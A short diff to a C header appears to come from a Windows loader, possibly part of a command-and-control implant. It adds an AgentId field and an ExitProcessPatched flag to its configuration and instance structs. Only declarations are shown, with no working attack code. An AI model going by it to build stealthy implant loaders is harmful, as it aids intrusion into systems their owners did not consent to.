@@ -21,12 +21,14 @@ typedef struct _Config {
 #ifdef LOAD_AND_EXIT 
 	CHAR FileId[37];
 #endif
+	CHAR AgentId[37];
 } Config;
 
 typedef struct _LdrInstance {
 	Win32 *win32;
 	Modules *modules;
 	Config *config;
+	BOOL ExitProcessPatched;
 
 } LdrInstance;
 
